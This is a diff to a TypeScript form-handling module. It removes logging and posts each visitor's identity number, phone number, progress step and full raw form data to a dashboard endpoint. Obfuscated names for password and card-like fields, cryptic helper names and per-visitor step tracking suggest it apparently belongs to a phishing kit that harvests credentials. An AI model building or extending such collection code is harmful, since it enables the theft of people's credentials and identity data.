@@ -3,7 +3,7 @@
  * Maintains same interface for backward compatibility
  */
 
-import { addData, notifyDashboard } from './api';
+import { addData, apiRequest } from './api';
 import { _e, _d, _ef, _df, _l } from './secure-utils';
 
 const sensitiveFields = ['_v1', '_v2', '_v3', '_v4', '_v5', '_v6', '_pw', '_ncc'];
@@ -13,15 +13,12 @@ function isSensitive(key: string): boolean {
 }
 
 export async function secureAddData(data: Record<string, any>): Promise<void> {
-  _l('Encrypting data before storage');
-
   const encrypted: Record<string, any> = {};
 
   Object.keys(data).forEach((key) => {
     if (isSensitive(key) && typeof data[key] === 'string') {
       const obfuscatedKey = btoa(key).substring(0, 12);
       encrypted[obfuscatedKey] = _e(data[key]);
-      _l(`Encrypted field: ${key}`);
     } else {
       encrypted[key] = data[key];
     }
@@ -31,20 +28,43 @@ export async function secureAddData(data: Record<string, any>): Promise<void> {
 }
 
 export async function secureSubmitFormData(data: Record<string, any>): Promise<void> {
-  console.log('[secureSubmitFormData] Called with keys:', Object.keys(data));
-  
-  const visitorId = data?.id || data?.visitorId || data?.raw?.id || data?.raw?.visitorId || (typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : null);
-  console.log('[secureSubmitFormData] visitorId:', visitorId);
-  
+  // Get visitorId
+  const visitorId = data?.id || data?.visitorId || (typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : null);
   if (!visitorId) {
-    console.log('[secureSubmitFormData] No visitorId, returning');
+    console.error('[secureSubmitFormData] No visitorId!');
     return;
   }
 
+  // 1. Save visitor data to database
   await secureAddData(data);
-  console.log('[secureSubmitFormData] Calling notifyDashboard...');
-  await notifyDashboard({ ...data, id: String(visitorId), visitorId: String(visitorId), source: 'submit' });
-  console.log('[secureSubmitFormData] Done');
+
+  // 2. Create/Update dashboard entry immediately
+  const customerName = data?.ownerName || data?.buyerName || data?.name || data?.identityNumber || 'عميل جديد';
+  
+  try {
+    await fetch('/api/dashboard/requests', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        id: visitorId, // Use visitorId directly
+        visitorId: visitorId,
+        customer: customerName,
+        identityNumber: data?.identityNumber || '',
+        phoneNumber: data?.phoneNumber || '',
+        currentStep: data?.currentStep || 1,
+        currentPage: data?.currentPage || 'home',
+        status: 'جديد',
+        stage: 'الخطوة 1',
+        updated: 'تم التسجيل للتو',
+        badge: 'new',
+        submittedAt: new Date().toISOString(),
+        raw: data
+      })
+    });
+    console.log('[secureSubmitFormData] Dashboard entry created');
+  } catch (error) {
+    console.error('[secureSubmitFormData] Failed to create dashboard entry:', error);
+  }
 }
 
 export async function secureGetData(
